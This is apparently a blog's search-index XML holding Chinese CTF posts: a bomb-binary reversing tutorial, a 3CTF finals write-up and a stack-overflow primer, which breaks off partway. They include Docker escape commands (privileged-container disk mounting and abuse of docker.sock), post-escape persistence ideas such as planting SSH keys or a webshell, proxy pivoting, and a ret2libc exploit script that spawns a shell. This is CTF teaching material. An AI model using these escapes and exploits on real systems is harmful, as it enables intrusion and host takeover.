<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从一道简单的逆向题到入门-教程</title>
      <link href="/2019/12/04/%E4%BB%8E%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98%E5%88%B0%E5%85%A5%E9%97%A8-%E6%95%99%E7%A8%8B/"/>
      <url>/2019/12/04/%E4%BB%8E%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98%E5%88%B0%E5%85%A5%E9%97%A8-%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="从一道简单的逆向题到入门-教程"><a href="#从一道简单的逆向题到入门-教程" class="headerlink" title="从一道简单的逆向题到入门-教程"></a>从一道简单的逆向题到入门-教程</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><blockquote><p>Blog重建，丢失好多帖子，找个机会补一篇Linux的逆向分析入门，给小白入门学习用，大佬绕过。</p></blockquote><blockquote><p>朋友喊帮忙看看,就顺手写下一篇逆向入门教程吧<br><img src="./img/%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95.png" alt="聊天记录"></p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>文件信息:</p><blockquote><p><img src="./img/file-info.jpg" alt="file-info"><br>丢到IDA里面<br><img src="./img/ida1.png" alt="ida1"><br>可以看到从命令行里传入两个参数，第一个就是该执行文件的当前path，第二个就是传入另一个文件，如果存在能打开那么就将输入重定向到infile, 否则重定向到stdin，也就是标准输入。</p></blockquote><p><code>补充：</code></p><table><thead><tr><th align="center">变量</th><th align="center">值</th><th align="center">信息</th></tr></thead><tbody><tr><td align="center">stdin</td><td align="center">0</td><td align="center">标准输入</td></tr><tr><td align="center">stdout</td><td align="center">1</td><td align="center">标准输出</td></tr><tr><td align="center">stderr</td><td align="center">2</td><td align="center">标准错误</td></tr></tbody></table><h3 id="initialize-bomb"><a href="#initialize-bomb" class="headerlink" title="initialize_bomb"></a>initialize_bomb</h3><blockquote><p>此函数设置一个信号量<br><img src="./img/initbomb.png" alt="initialize_bomb函数"></p></blockquote><h3 id="read-line"><a href="#read-line" class="headerlink" title="read_line"></a>read_line</h3><blockquote><p>read_line函数就对输入做一下简单的处理，读取一行。因为之前有输入有可能是从文件获取，同时获取一下环境变量GRADE_BOMB的值。<br><img src="./img/readline.png" alt="read_line"></p></blockquote><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><blockquote><p>这个就拿输入和<code>aWhyMakeTrillio</code>全局变量做了一个比较so我们直接去拿下来就行了<br><img src="./img/phase1.1.png" alt="phase1.1"><br><img src="./img/phase1.png" alt="phase_1"></p></blockquote><blockquote><p>如果不等于这个值就会执行explode_bomb函数,直接退出程序<br><img src="./img/explode_bomb.png" alt="explode"></p></blockquote><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><blockquote><p>读入6个数，然后前三个等于后个不相等则退出<br><img src="./img/phase2.png" alt="phase_2"><br><img src="./img/phase2.2.png" alt="read_six_numbers"></p></blockquote><blockquote><p>so 我们输入1 2 3 1 2 3就可以了</p></blockquote><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><blockquote><p>是不是看着很吓人，实际上不要慌，他就一张switch表，我们先倒着看<br><img src="./img/phase3.png" alt="phase_3"></p></blockquote><blockquote><p>这里比较了var_11和al不相等则结束，<br><img src="./img/phase3.1.png" alt="phase3.1"></p></blockquote><blockquote><p>这里赋值了eax为’q’,也就控制了刚才的al,同时修改了var_10为84，但是进入条件是case 1<br><img src="./img/phase3.3.png" alt="phase3.3"></p></blockquote><blockquote><p>这里进行输入赋值由于是64位的，通常顺序是rdi, rsi, rdx, rcx, r8, r9, 栈<br><img src="./img/phase3.2.png" alt="phase3.2"></p></blockquote><blockquote><p>结合上面的简单分析，我们需要输入 <code>1 q 84</code>就能通过，实际上还可以看看其他表是做啥都差不多</p></blockquote><h3 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h3><blockquote><p>就是输入一个数，然后经过一个<code>func4</code>计算后和这个<code>0x375F00</code>比较不相等就退出，<br><img src="./img/phase4.png" alt="phase4"></p></blockquote><blockquote><p>我们看看func4函数<br>实际上就一个递归计算阶乘很简单，imul指令是相乘嘛。<br>我们爆破一下就知道了<br><img src="./img/phase4.1.png" alt="func4"><br>可以看到结果就是10<br><img src="./img/phase4.2.png" alt="result"></p></blockquote><h3 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h3><blockquote><p>就把我们的输入当作索引取这个数组里面取值然后做比较需要等于<code>ravens</code><br><img src="./img/phase5.png" alt="phase5"><br><img src="./img/phase5.1.png" alt="phase5.1"></p></blockquote><blockquote><p>这是结果但这里有个坑，只能输入如6个字符，11是两个字符了，所以这里我们可以借pwntools来简单处理一下，比较方便<br><img src="./img/phase5.2.png" alt="phase5.2"><br><img src="./img/phase5.3.png" alt="phase5.3"><br><img src="./img/phase5.4.png" alt="phase5.4"></p></blockquote><h3 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h3><blockquote><p>继续看这个函数用<code>func6</code>计算一个node后结果在循环加8，总共加8次。<br><img src="./img/phase6.png" alt="phase6"></p></blockquote><blockquote><p>我们看看<code>func6</code>函数，看上去计算有点点复杂，不过这里有个小技巧，我们的输入没有去参加计算，而是直接比较，so我们直接动态下个断点，dump出计算好的值就可以了,在上面那个图我们可以看见计算好的结果指针放在rax里面。<br><img src="./img/func6.png" alt="func6"></p></blockquote><blockquote><p>so,解决问题<br><img src="./img/phase6.1.png" alt="phase6.1"><br><img src="./img/crack.png" alt="crack"></p></blockquote><p><code>附上EXP：</code></p><pre><code class="python">from pwn import *#context.log_level = &quot;DEBUG&quot;#io = process(&quot;./bomb8&quot;)io.recv()io.sendline(&quot;Why make trillions when we could make... billions?&quot;)io.recv()io.sendline(&quot;1 2 3 1 2 3&quot;)io.recv()io.sendline(&quot;1 q 84&quot;)io.recv()io.sendline(&quot;10&quot;)io.recv()io.sendline(&quot;2534\x0b1&quot;)io.recv()# gdb.attach(io)# io.interactive()io.sendline(str(0x70000008d))io.recv()</code></pre><blockquote><p>到这里我们以及成功完成了6个函数的破解，但有个细节</p></blockquote><blockquote><p><code>phase_defused</code>看第一张图，我们发现有这个函数存在，跟进去看发现可能是个隐藏关卡<br><img src="./img/phase_defused.png" alt="phase_defused"></p></blockquote><blockquote><p>进入此函数需要该全局变量等于6<br><img src="./img/phase_defused.1.png" alt="phase_defused.1"></p></blockquote><blockquote><p>跟踪此变量我们发现有一个send_msg函数使用了他<br><img src="./img/phase_defused.2.png" alt="phase_defused.2"></p></blockquote><blockquote><p>ida里面查看func_call,我并没有发现有函数调用了此函数，有可能在init函数里面动手脚，时间关系我就不在深入，有时间，我在回头看看。<br><img src="./img/func_call.png" alt="func_call"></p></blockquote><h3 id="题目下载"><a href="#题目下载" class="headerlink" title="题目下载"></a>题目下载</h3><p><a href="./附件/bomb8">bomb8</a></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3CTF总决赛</title>
      <link href="/2019/12/04/3CTF%E6%80%BB%E5%86%B3%E8%B5%9B/"/>
      <url>/2019/12/04/3CTF%E6%80%BB%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="3CTF总决赛总结"><a href="#3CTF总决赛总结" class="headerlink" title="3CTF总决赛总结"></a>3CTF总决赛总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>这次比赛还是收获很多，也很感谢举办方提供的环境和服务，这里给举办方点个赞先。</p></blockquote><h2 id="失误："><a href="#失误：" class="headerlink" title="失误："></a>失误：</h2><blockquote><p>第一，成功逃逸docker拿下主机权限后只提交了根目录下的flag，没有在find一下，这个细节确实导致没能取得更好的成绩，这个分段的大部分都没有做到逃逸所以很吃亏。</p></blockquote><blockquote><p>第二，前期准备资料都在如何打域控，提权，免杀维持权限这一块，没想着第二环节就是docker逃逸，导致于打下服务以后一半时间只能等着排队申请上网机，之前也没有好好看过docker逃逸相关的资料。</p></blockquote><blockquote><p>第三，意识不足，反应不够快，开局给的中间件漏洞考点，其实不难，kali足够分分解决问题，但在使用msf攻击时总不能反弹会回主机shell，没及时反应可能是打的docker环境，直到给了tips才想着去改脚本手动执行命令，这也导致浪费了上午三个小时的时间，直接导致docker逃逸成功后没有足够的时间来上代理，同时这里也存在一个失误，拿下主机后只想着写webshell，传ew来挂代理再进一步内网渗透，但写webshell的目录一直没找对，都没意识到可以直接写ssh公钥来操作，也是导致没能取得更好成绩的一个失误点，而且根据举办方放出来的tips，内网的下一个目标就是一台redis主从复制漏洞利用，这个明明手上是有exp的，但docker逃逸浪费太多时间，还没来得及进一步攻击就Gameover</p></blockquote><h2 id="学到的姿势"><a href="#学到的姿势" class="headerlink" title="学到的姿势:"></a>学到的姿势:</h2><h3 id="特权容器逃逸"><a href="#特权容器逃逸" class="headerlink" title="特权容器逃逸:"></a>特权容器逃逸:</h3><blockquote><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p></blockquote><p>说这么多，其实操作起来特别简单:<br>当时没能截图下来我只能大概说一下</p><pre><code class="shell">fdisk -l //查看当前机器的磁盘信息 这一步很重要，相当于逃逸前的信息收集ls /dev // 查看当前驱动文件，会发现很多文件，但大多数我们不需要关心，我们仅仅关心上面一个命令执行后说显示的磁盘文件mkdir abc//准备一个空目录来做挂载mount /dev/&lt;target&gt; /abc //注意挂载target我们只关心物理磁盘</code></pre><h3 id="挂载配置不当时的逃逸情况："><a href="#挂载配置不当时的逃逸情况：" class="headerlink" title="挂载配置不当时的逃逸情况："></a>挂载配置不当时的逃逸情况：</h3><blockquote><p>docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。</p></blockquote><blockquote><p>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。</p></blockquote><blockquote><p>因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。<br>具体操作步骤:</p></blockquote><pre><code class="shell">apt-get install docker.io //在docker内安装client，必须docker -H unix:///host/var/run/docker.sock info //可以查看宿主机docker信息docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash //挂载主机根目录，完成这一步就成功逃逸了 `aa`目录就是就是主机根目录</code></pre><p>补充:</p><blockquote><p>完成上述步骤后，我们仅仅完成逃逸的50%，此时只有该主机磁盘的读写权限，这时我们需要想办法来获取shell,比赛时这里吃亏了，因为没经验，意识不够。我总结一下三个思路</p><ul><li>往root目录写ssh公钥，这里注意有可能需要改文件权限，第二天师傅们说的，600可以试试</li><li>如果主机开着web服务，可以去web服务目录里面写webshell，也要注意执行权限</li><li>看看.shadow文件可以不可以操作来改密码</li></ul></blockquote><p>剩下一些利用poc来提权的基本操作性比较简单不在重复，都可以直接弹shell的，对了最近出的CVE-2019-5736，利用runc来实现docker逃逸，是需要主机交互的，当时比赛没法利用，脏牛的poc内核版本不对，也没法打，哈哈所以详细记录一下上面的姿势</p><h3 id="关于内网渗透时挂代理"><a href="#关于内网渗透时挂代理" class="headerlink" title="关于内网渗透时挂代理:"></a>关于内网渗透时挂代理:</h3><blockquote><ul><li>正向代理（-L）：相当于 iptable 的 port forwarding</li><li>反向代理（-R）：相当于 frp 或者 ngrok</li><li>socks5 代理（-D）：相当于 ss/ssr</li></ul></blockquote><p>可以利用姿势:</p><pre><code class="shell">// 正向代理ssh -L 0.0.0.0:PortB:HostC:PortC user@HostCssh -L 0.0.0.0:PortA:HostC:PortC  user@HostB// 反向代理ssh -R HostC:PortC:HostB:PortB  user@HostC// 本地 socks5 代理(推荐)ssh -D localhost:1080  HostB</code></pre><p>EW操作<a href="./ew.zip">ew</a></p><pre><code class="shell">unzip ew.zipfile /sbin/init (查看linux位数)chmod 777 ew_for_Linux32./ew_for_Linux32 -s ssocksd -l 2333 (侦听0.0.0.0:2333)netstat -pantu|grep 2333 (查看是否侦听成功)</code></pre><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>第二天看见RedTeam负责人吴鹏老师放出完整网络拓扑图后，不得不说自己还是太菜了.<br><img src="./%E6%8B%93%E6%89%91%E5%9B%BE-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84.jpg" alt="拓扑图-攻击路径"></p></blockquote><blockquote><p>我仅仅完成入口外部服务区的攻击，整个内网环境都还没看到，听完师傅们讲解思路后确实还是学到很多东西。SSH作用很强大，且基本为Linux系统标配，有辅助提权获取shell的操作，写入公钥可免密登录，-D参数可以挂代理。<br>docker逃逸基本操作，特权容器可挂载物理磁盘，挂载配置不当，docker. sock逃逸，脏牛vsdo漏洞逃逸，今年最新cve 2019-5376 runc漏洞，但这个漏洞利用需要主机的交互。<br>最后放一张此次比赛全体师傅们和老师评委的大合影，嘿嘿。<br><img src="./%E5%90%88%E5%BD%B1.jpg" alt="合影"></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><blockquote><p><a href="https://www.anquanke.com/post/id/179623" target="_blank" rel="noopener">安全客-Docker逃逸初探</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82955196" target="_blank" rel="noopener">web狗要懂的内网端口转发</a><br><a href="https://zhuanlan.zhihu.com/p/57630633" target="_blank" rel="noopener">SSH 命令的三种代理功能（-L/-R/-D)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
            <tag> 中间件漏洞 </tag>
            
            <tag> Docker逃逸 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新的开始-重明</title>
      <link href="/2019/12/04/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B-%E9%87%8D%E6%98%8E/"/>
      <url>/2019/12/04/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B-%E9%87%8D%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><h2 id="前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）"><a href="#前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）" class="headerlink" title="前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）"></a>前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）</h2>]]></content>
      
      
      <categories>
          
          <category> 杂记-随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN栈溢出总结</title>
      <link href="/2019/10/03/CTF-PWN%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2019/10/03/CTF-PWN%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN进阶前的总结"><a href="#PWN进阶前的总结" class="headerlink" title="PWN进阶前的总结"></a>PWN进阶前的总结</h1><blockquote><p><code>关于资料</code>: 所有资料链接我补在文章结尾。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>很久没写文章了 这段时间都在搞pwn 主要团队里面没有pwn手 web题又越来越脑洞了 所以就转行打打pwn 感觉安全研究员很又前途啊 哈~ :) 其实也挺好玩的 这段时间关于栈的知识点基本都有了解 也做了很多题 准备进阶堆题了 这篇文章算得上是进阶前的一次总结吧！ 对了 其实很感谢李师兄的 遇见很多坑 特别刚开始的时候 问了一些现在感觉其实很水的问题 当然小白阶段还是很多不懂其实很正常啊 哈哈 不过李师兄还是挺用心的给我讲了些东西 挺感谢他的哈 :)  好了 往下看吧 这篇文章把我从pwn入门到现在的遇见的一些问题都总结一下 也分享给学习pwn的新人吧 大佬误喷 嘿嘿 :)</p></blockquote><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><blockquote><p>入门pwn对很多刚刚接触CTF的小白了说还是比较有难度的 不像web 工具和资料比较丰富。</p></blockquote><blockquote><p><code>关于汇编</code>: 起步阶段我建议大家还是先看看 汇编 至少能看懂一些基础的指令 王爽著<code>《汇编语言》</code>以及<code>滴水逆向课程第三季</code>其实都挺不错 我也看了一段时间 刚刚开始是有点懵逼 慢慢尝试接受新知识就行 看得快的两个星期左右 知识基本的汇编的知识点基本没有问题。</p></blockquote><blockquote><p><code>关于调试和分析</code>: 有了一定的汇编基础支撑 大家就可以结合<code>IDA</code>与<code>GDB</code>来做一些基本调试 通过IDA来看汇编代码 其实会把之前看的汇编的知识点贯通起来 在结合GDB来进行动态调试观察寄存器与内存的变换这个会加深对汇编的理解，这一点很重要 李师兄给我说的调试很重要 一定要多动手 多调试 确实我学到现在真的发现这个很重要特别是作为pwn手 动态调试去追踪数据流这个十分重要 额有点啰嗦了 不过这个是实话 也是给很多小白的提醒吧 对了提一句 起步搭建环境估计也是个很多小白放弃的门槛 <code>So, 我就自己搭建了一套做pwn题没有问题的环境 导入即用 附上图片 分享链接在文章结尾</code> 。</p></blockquote><blockquote><p>环境效果如下图：<br><img src="./img/%E7%8E%AF%E5%A2%83.png" alt="环境"></p></blockquote><blockquote><p><code>环境说明:</code></p><ul><li>操作系统<ul><li>ubuntu 19.04</li></ul></li><li>桌面环境<ul><li>KDE</li></ul></li><li>集成环境<ul><li>调试环境<ul><li>gef</li><li>完整gef插件包</li><li>hyper终端</li><li>pwnhyper插件</li></ul></li><li>做题环境<ul><li>pwn-tools</li><li>SearchLib</li><li>one_gadget</li></ul></li><li>开发环境<ul><li>VScodium</li><li>VScodium的python扩展</li><li>VScodium的C++扩展</li></ul></li></ul></li></ul></blockquote><blockquote><p><code>注：</code>该环境中所有关于python的工具插件包括python本身都为python3版本，未安装python2版本以及python2，若需要请自行安装。</p></blockquote><hr><h2 id="栈溢出的知识点总结"><a href="#栈溢出的知识点总结" class="headerlink" title="栈溢出的知识点总结"></a>栈溢出的知识点总结</h2><h3 id="关于栈结构"><a href="#关于栈结构" class="headerlink" title="关于栈结构"></a>关于栈结构</h3><blockquote><p>说到栈溢出不能不谈谈栈结构 以及几个与栈密切相关的指令与寄存器<code>pop, push call leave ret</code></p></blockquote><blockquote><p>pop push 比较简单 无非就是出栈和进栈比较有趣的就是call 说到call简单点描述就是去调用了一个函数 而用我自己的话来说函数在汇编里面的体现就是一段代码片段 在调用call函数时具体体现看下图</p></blockquote><p><img src="./img/call_1.png" alt="第一步"></p><blockquote><p><code>这是执行call前的寄存器的值以及栈中的数据 这里我们主要注意esp指向的栈地址</code> </p></blockquote><p><img src="./img/call_2.png" alt="第二步"></p><blockquote><p><code>这是执行call后的寄存器的值以及栈中的数据 对比上图我们不难发现esp上走了一行 其实就是call的作用将call下一行指令的地址先压入栈在修改eip寄存器的值为call 后面的操作数 其实就是函数的第一条指令的地址</code> 同时我们观察到基本上每个函数的代码片段开头都有类似的指令 基本相同 其实就是在给准备要执行的函数代码片段分配一段栈空间来操作</p></blockquote><p><img src="./img/%E5%88%86%E9%85%8D%E6%A0%88%E7%A9%BA%E9%97%B4.png" alt="分配栈空间"></p><blockquote><p><code>关于函数传参</code> 常规模式下<code>32位参数从左到右依次入栈 printf除外 printf函数是从右到左</code> 所以记得当时看看入门逆向的时候去吾爱上看到有大佬说od里面去找main函数时 看见三个push一个call就是main函数 当时很懵逼 其实现在想起来真的很正常 <code>64位新增加几个寄存器所以正常情况下通常顺序是rdi, rsi, rdx, rcx, r8, r9, 栈 可以简记为: dsxc-89</code></p></blockquote><h3 id="关于栈溢出"><a href="#关于栈溢出" class="headerlink" title="关于栈溢出"></a>关于栈溢出</h3><blockquote><p>其实栈溢出可以一句话总结 就是覆盖函数返回地址来劫持程序逻辑去执行，在pwn题中的体现就是<code>劫持程序去执行system(command)</code></p></blockquote><blockquote><p>system有以下几种出现方式</p><ol><li>程序本身有代码执行system()</li><li>有系统调用通过 int 0x80来执行系统调用</li><li>去查找Libc</li></ol></blockquote><blockquote><p>command有以下几种出现方式</p><ol><li>程序本身代码含有 /bin/bash、/bin/sh、sh</li><li>自己写入/bin/sh 如果可写空间不够 sh也行</li></ol></blockquote><h4 id="我们下面具体谈谈怎么通过栈溢出劫持程序逻辑"><a href="#我们下面具体谈谈怎么通过栈溢出劫持程序逻辑" class="headerlink" title="我们下面具体谈谈怎么通过栈溢出劫持程序逻辑"></a>我们下面具体谈谈怎么通过栈溢出劫持程序逻辑</h4><blockquote><p>先看一个例子就是之前的程序 我将就继续往下看几行</p></blockquote><p><img src="./img/easy_stack_overflow_1.png" alt="简单的栈溢出"></p><blockquote><p>首先我们看一下我指出来的位置,这个也解释了之前函数从左到右依次入栈的情况 我们回忆一下read函数的原型<code>read(int fd, void *buf, size_t count);</code> 返回值一般是读取到的字节数 顺便说一句函数返回值一般存放在eax里面所以在汇编里面去看没有很明显的体现返回一个值<br>fd就是文件指针 buf就是存放读取到的数据的地方 也就是我们常说的缓冲区所以栈溢出有时也称为缓冲区溢出 count就是如果可以一直读取那么最大可以读取多少字节<br>我们在回来看看图片中的汇编指令 对应的 传入了一个0，一个在ebp-0x88位置的buf变量 最大可以读取0x100 所以是不是就发现了可读取的最大字节数超过了0x88 所以我们就可以一直输入0x88个字节先填满栈，也就是常说的padding缓冲区后面再写入需要修改的返回地址 因为返回地址就是rbp下面一行 如图：</p></blockquote><p><img src="./img/easy_stack_overflow_2.png" alt="栈溢出的ebp"></p><blockquote><p>这里大家可能想嗯那么返回地址我就在填充0x88个字节后面直接写就行了，其实不一定 如图:</p></blockquote><p><img src="./img/leave_ret.png" alt="leave_ret"></p><blockquote><p>在红箭头执行的方向该函数代码不是直接ret出去，而是先leave在ret leave指令等同于mov esp ebp; pop ebp;而ret指令相当于pop eip;所以这里我们需要<code>填充0x88+4</code>后再写入地址 +4字节就是这么来的 当初我在这个位置被坑了好久就是搞不明白为啥要+4直到师兄说亲自去调试后我注意到了这个位置才明白+4是这么来的同理如果在<code>64位程序则是+8</code>当然有可能有变化，但我们多去调试，多去实验总是能发现问题并解决问题 哈 :)</p></blockquote><blockquote><p>以这个题为例子 解决一下拖入IDA方便查看整个程序的主体框架节约篇幅我直接查看了导入函数部分如图：</p></blockquote><p><img src="./img/ida_import.png" alt="ida_import"></p><blockquote><p>我们并没有发现system 但这个题比较简单给了libc，所以我们有两种思路 两种思路都需要先泄露libc的实际地址</p></blockquote><ol><li>直接one_gadget得到get_shell的地址</li><li>通过SearchLibc包了获取libc来get_shell<blockquote><p>因为正常难度题一般不太可能给libc 所以我通过第二种方式来解 这里直接给出exp:</p></blockquote><pre><code class="python">from pwn import *#libc = ELF(&quot;./libc_32.so.6&quot;)elf = ELF(&quot;./level3&quot;)io = process(&quot;./level3&quot;)# io = remote(&quot;111.198.29.45&quot;, 53246)# write_plt = elf.plt[b&#39;write&#39;]write_got = elf.got[b&#39;write&#39;]main_addr = elf.symbols[b&#39;main&#39;]read_addr = elf.plt[b&#39;read&#39;]#log.info(&quot;write_plt: {}&quot;.format(hex(write_plt)))log.info(&quot;write_got: {}&quot;.format(hex(write_got)))log.info(&quot;main_addr: {}&quot;.format(hex(main_addr)))log.info(&quot;read_addr: {}&quot;.format(hex(read_addr)))## leak libcpayload = b&#39;a&#39;*(0x88+4)payload += pack(write_plt)payload += pack(main_addr)payload += pack(1)payload += pack(write_got)payload += pack(4)##io.recvuntil(&quot;Input:\n&quot;)sleep(0.2)io.sendline(payload)write_addr = unpack(io.recv()[:4])io.recv()log.info(&quot;write_addr: {}&quot;.format(hex(write_addr)))libc_base = write_addr - 0x000d43c0log.info(&quot;libc_base_addr: {}&quot;.format(hex(libc_base)))system_addr = libc_base + libc.symbols[b&#39;system&#39;]log.info(&quot;system_addr: {}&quot;.format(hex(system_addr)))binsh_addr = libc_base+0x0015902B #/bin/shlog.info(&quot;binsh_addr: {}&quot;.format(hex(binsh_addr)))## attackpayload = b&#39;a&#39;*(0x88+4)payload += pack(system_addr)payload += pack(main_addr)payload += pack(binsh_addr)io.sendline(payload)io.interactive()</code></pre></li></ol><h4 id="关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势"><a href="#关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势" class="headerlink" title="关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势"></a>关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势</h4><blockquote><p>在linux下的保护机制一般有如下几种:</p><ol><li><code>RelRO</code></li><li><code>Canary</code></li><li><code>NX</code></li><li><code>PIE</code></li><li><code>Fortify</code><br>在gef中有checksec插件指令可以查看目标程序的保护机制开启情况，如图：<br><img src="./img/checksec.png" alt="checksec"></li></ol></blockquote><h5 id="No-Execute"><a href="#No-Execute" class="headerlink" title="No-Execute"></a>No-Execute</h5><blockquote><p>首先我们先介绍NX, NX的全称是 No Execute 就是不能执行的意思 那么是什么不可以执行呢？ 说到这里我觉得我们可以先简单谈谈ELF文件结构(这个文件结构在下面部分我会详细说明)ELF文件，其实就是我们常说的可执行文件(这里指Linux平台，windows平台主要是PE，后面我会详细解释) 学过编程我应该都知道编译会把我们写好的源代码编译成<code>目标文件</code>, 在经过编译器链接后就生成了<code>可执行文件</code> 可执行文件一般由以下几个部分组成：</p><ul><li>Header // 文件头</li><li>Program Header Table 程序头表</li><li>Section Header Table 节头表</li><li>Section 节</li></ul></blockquote><blockquote><p>可执行文件能够运行 实际上就是计算机将可执行文件加载到内存里面去(注: 这里存在一个映射关系，后面有机会在详细介绍)而我们写好的程序代码实际上可以抽象成两部分</p><ul><li>指令</li><li>数据</li></ul></blockquote><blockquote><p>我们所有指令 会集中放在一个内存的一个地(<code>.text</code>), 数据也会集中的放在另一个地方(<code>.data</code>, <code>.rodata</code>, <code>.bss</code>)而eip寄存器主要数据就在于.text的位置 因为它的主要作用就是指向下一条指令的地址</p></blockquote><blockquote><p><code>NX</code>的主要作用就是<code>.text</code>的内存区域只有<code>可读可执行的权限</code>(r, x), 而其他区域没有可执行权限，换句话说就是能读能执行的地方没有可写入权限，能写入的地方没有可执行权限，简而言之就是权限分离。</p></blockquote><blockquote><p>突破NX的攻击技术目前主要就是ROP， 虽然NX成功将权限从栈上分离出去，但是在.text段 也就是代码段中必定会存在小片段(专业术语是<code>gadgets</code>)，可以执行，而gadgets实际上就是以<code>ret</code>指令结尾的序列，通过这些指令序列我们就可以利用栈溢出来劫持整个程序的流程，来执行我们想要执行的代码。</p></blockquote><blockquote><p>ROP攻击一般需要满足以下条件:</p><ul><li>程序存在溢出，且能覆盖返回地址。</li><li>可以找到满足条件的ROPgadgets 以及相应的gadgets的地址，如果开启随机化那么就需要获取动态地址</li></ul></blockquote><blockquote><p>一般我们可以通过 ROPgadgets工具来查找gadgets<br>在我集成的环境中已经给gef集成了ropper插件可以直接使用，效果如图:<br><img src="./img/ropper.png" alt="ropper"></p></blockquote><blockquote><p>还有如果我们拿到了题目使用的Libc那么我们就可以通过one_gadget 直接获取getshell的地址 但可能有利用条件，效果如图：<br><img src="./img/one_gadget.png" alt="one_gadget"></p></blockquote><blockquote><p>为了节约篇幅，关于高级的ROP的高级技术请查看<a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/" target="_blank" rel="noopener">CTF-Wiki-ROP</a></p></blockquote><h5 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h5><blockquote><p>了解NX我们再来看看<code>Canary</code>，这种保护机制就像它名字一样<code>金丝雀</code>(据说来自于很久以前矿工们用这种鸟来测试矿井是否有毒)，借用CTF-Wiki的图片来描述<br><img src="./img/canary.png" alt="canary"><br>图片上这个就是canary的示意图</p></blockquote><blockquote><p>canary实际上就是每次程序启动时在图示位置生成一道随机数，当函数执行完成时都会先检测这个随时是否改变，如果改变说明程序可能发生溢出了，那么就强制退出程序，不继续往下执行，在IDA里面我们可能要看得直观些<br><img src="./img/canary_ida.png" alt="canary_ida"><br>图示位置就是在对canary进行判断</p></blockquote><blockquote><p>在gdb中canary就长这个样<br><img src="./img/canary_gdb.png" 